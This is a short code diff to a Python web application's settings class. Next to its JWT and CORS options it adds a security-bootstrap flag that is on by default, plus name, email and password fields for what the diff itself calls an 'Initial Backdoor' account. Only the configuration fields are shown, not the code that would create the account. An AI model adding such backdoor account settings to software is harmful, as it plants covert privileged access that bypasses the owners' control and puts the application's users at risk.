@@ -52,6 +52,10 @@ class Settings(BaseSettings):
         description="Secret key for JWT and session encryption (min 32 chars)"
     )
     JWT_EXPIRE_MINUTES: int = 1440  # 24 hours
+    SECURITY_BOOTSTRAP_ENABLED: bool = True
+    INITIAL_BACKDOOR_NAME: str = "Initial Backdoor"
+    INITIAL_BACKDOOR_EMAIL: Optional[str] = None
+    INITIAL_BACKDOOR_PASSWORD: Optional[str] = None
     
     # ========== CORS SETTINGS ==========
     CORS_ORIGINS: str = "http://localhost:3000,http://localhost:8000"
